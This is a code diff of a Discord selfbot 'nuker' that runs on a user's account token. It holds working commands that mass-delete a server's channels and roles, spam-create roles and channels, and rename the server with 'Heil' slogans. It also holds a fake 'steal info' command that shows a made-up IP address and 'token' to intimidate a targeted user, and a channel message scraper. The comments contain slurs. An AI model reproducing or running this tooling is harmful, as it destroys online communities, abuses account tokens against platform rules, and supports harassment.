@@ -1,5 +1,3 @@
-
-
 import os
 # Hello, if you came here, I don't know how you find this repl
 # But don't fork this project nor skid it, if you do you're a fucking skidlord
@@ -19,7 +17,6 @@ import replit
 from colors import black, blue, red, green, yellow, cyan, reset, magenta, white
 import json
 import base64
-
 
 default_token = os.environ['defeault_token']
 usertoken = input("Insert your token > ")
@@ -73,222 +70,59 @@ proxy = next(proxy_pool)
 async def on_ready():
   print("\nSuccesfully connected.")
 
-
-thechans = []
-@slayer.command()
-async def nuke(ctx):
-    global checkweb
-    global serwer
-    checkweb = True
-    extrapayload = {
-        "banner": "null",
-        "icon": "null",
+headers = {
+    "Authorization": your_token
     }
-    serwer = str(ctx.guild.id)
+
+async def deletechannels_worker(queue):
+    # Rust told me how to do it, I don't know if it's skidded.
+    while True:
+        try:
+            async with aiohttp.ClientSession() as session:
+                channel = queue.get_nowait()
+                try:
+                    request = await session.delete(f"https://discordapp.com/api/v9/channels/{channel.id}", headers=headers, ssl=False)
+                except:
+                    pass
+                if request.status == 200:
+                    print(f"Deleted Channel - {channel}")
+                    queue.task_done()
+                elif request.status == 429:
+                    json = await request.json()
+                    print(f"Rape limited")
+                    await asyncio.sleep(json['retry_after'])
+                    queue.put_nowait(channel)
+                elif request.status in [401, 404, 403]:
+                    return
+                await session.close()
+        except Exception as e:
+            if isinstance(e, asyncio.QueueEmpty):
+                await session.close()
+                return
+            elif 'Cannot connect to host discordapp.com:443 ssl:default [Name or service not known]' in str(e):
+                queue.put_nowait(channel)
+            else:
+                print(e)
+
+
+@slayer.command(description="Asyncio Queue Cdel.")
+async def q_del(ctx):
     try:
         await ctx.message.delete()
     except:
         pass
-    guild = ctx.guild
-    try:
-        await guild.edit(name="Nuked by AOS and UAG | Heil Takaso")
-    except:
-        pass
-    try:
-        r = requests.patch(f"https://canary.discord.com/api/v9/guilds/{serwer}", headers=headers, json=extrapayload)
-    except:
-        pass
-    for channel in guild.channels:
-        thechans.append(channel.id)
-    try:
-        await deleteall()
-    except:
-        pass
-    try:
-        threadchan()
-    except:
-        pass
-    try:
-        roletasks = [deleteroles(ctx), rolenuke(ctx), lastcheck(ctx)]
-        asyncio.gather(*roletasks)
-    except:
-        pass
-
-channel_names = ["Hacked by Takaso", "Heil AOS", "sus"]
-
-
-##########################################################################################
-
-# Extra Command I made to test the channel delete
-
-@slayer.command()
-async def tester(ctx, amount = 100, *, name = None):
-  try:
-      await ctx.message.delete()
-  except:
-      pass
-  if name == None:
-    for x in range(amount):
-      try:
-        await ctx.guild.create_text_channel(random.choice(channel_names))
-      except discord.Forbidden:
-        print("aaaaa")
-        return
-      except:
-        pass
-  else:
-    for x in range(amount):
-      try:
-        await ctx.guild.create_text_channel(name)
-      except discord.Forbidden:
-        print("cazzo")
-        return
-      except:
-        pass
-
-
-
-async def deleteroles(ctx):
-    for roles in list(ctx.guild.roles):
-        try:
-            await roles.delete()
-        except:
-            pass
-
-async def rolenuke(ctx):
-    for x in range(500):
-        try:
-            await ctx.guild.create_role(name="Nuked by AOS and UAG, Heil Takaso")
-        except:
-            pass
-
-@slayer.command()
-async def lastcheck(ctx):
+    queue = asyncio.Queue()
     for channel in ctx.guild.channels:
-        if channel.name != "heil-aos":
-            try:
-                await channel.delete()
-            except:
-                pass
+        queue.put_nowait(channel)
+        print(f"Queuing all channels..")
+    tasks = []
+    for x in range(5):
+        task = asyncio.create_task(deletechannels_worker(queue))
+        tasks.append(task)
+    await queue.join()
+    for task in tasks:
+        task.cancel()
 
-#########################################################################################
-
-@slayer.command()
-async def load(ctx, ID):
-    await ctx.message.delete()
-    progress = [
-     "1% - 〔█                              〕",
-     "3% - 〔██                             〕",
-     "6% - 〔███                            〕",
-     "9% - 〔████                           〕",
-     "12% -〔█████                          〕",
-     "15% -〔██████                         〕",
-     "18% -〔███████                        〕",
-     "21% -〔███████                        〕",
-     "22% -〔███████                        〕",
-     "24% -〔████████                       〕",
-     "26% -〔█████████                      〕",
-     "29% -〔██████████                     〕",
-     "31% -〔███████████                    〕",
-     "36% -〔████████████                   〕",
-     "41% -〔█████████████                  〕",
-     "43% -〔██████████████                 〕",
-     "46% -〔███████████████                〕",
-     "49% -〔████████████████               〕",
-     "50% -〔████████████████               〕",
-     "52% -〔█████████████████              〕",
-     "56% -〔██████████████████             〕",
-     "59% -〔███████████████████            〕",
-     "64% -〔████████████████████           〕",
-     "69% -〔█████████████████████          〕",
-     "71% -〔██████████████████████         〕",
-     "74% -〔███████████████████████        〕",
-     "79% -〔████████████████████████       〕",
-     "82% -〔█████████████████████████      〕",
-     "86% -〔██████████████████████████     〕",
-     "89% -〔███████████████████████████    〕",
-     "93% -〔████████████████████████████   〕",
-     "93% -〔████████████████████████████   〕",
-     "94% -〔█████████████████████████████  〕",
-     "95% -〔█████████████████████████████  〕",
-     "96% -〔█████████████████████████████  〕",
-     "97% -〔█████████████████████████████  〕",
-     "98% -〔██████████████████████████████ 〕",
-     "100% -〔███████████████████████████████〕",
-     "100% -〔███████████████████████████████〕",
-     "100% -〔███████████████████████████████〕",
-     ]
-    kkk = await ctx.send(f"```\nStarting the process to steal <@{ID}>'s info.\n```")
-    bar = await ctx.send("```\n0% - 〔█                              〕\n```")
-    for loads in progress:
-        await bar.edit(content=f"""
-```
-[{loads}]
-```
-""")
-    await kkk.delete()
-    await bar.delete()
-    IP1 = random.randint(0, 255)
-    IP2 = random.randint(0, 255)
-    IP3 = random.randint(0, 255)
-    IP4 = random.randint(0, 255)
-    sample_string = str(ID)
-    sample_string_bytes = sample_string.encode("ascii")
-    base64_bytes = base64.b64encode(sample_string_bytes)
-    base64_string = base64_bytes.decode("ascii")
-    try:
-        await ctx.send(f"""
-```
-Here's the Info:
-
-IPv4: {IP1}.{IP2}.{IP3}.{IP4}
-First piece of Token: {base64_string}
-```
-""")
-    except:
-        print(f"\n%sSomething went wrong, you got kicked from the guild or either the user blocked you, here's your argument {ID} in case you wanna Toxx him.%s" % (red(), reset()))
-
-    
-@slayer.command()
-async def purge(ctx):
-    await ctx.message.delete()
-    async for message in ctx.message.channel.history(limit=500).filter(
-        lambda m: m.author == slayer.user
-    ).map(lambda m: m):
-        try:
-            await message.delete()
-        except:
-            pass
-
-
-@slayer.command()
-async def scrape_messages(ctx, ID = None):
-    global Channel_ID
-    Channel_ID = ID
-    try:
-        await ctx.message.delete()
-    except:
-        pass
-    if ID == None:
-        s = await ctx.send("Insert an ID.")
-        asyncio.sleep(4)
-        await s.delete()
-    try:
-        message_scraper()
-    except:
-        pass
-
-def message_scraper():
-    global Channel_ID
-    headers = {
-        "Authorization": usertoken
-    }
-
-    r = requests.get(
-        f"https://discord.com/api/v9/channels/{Channel_ID}/messages", headers=headers)
-    jsonn = json.loads(r.text)
-    for value in jsonn:
-        print(f"Name: {value['author']['username']}, Message: {value['content']}", "\n")
 
 thechans = []
 @slayer.command()
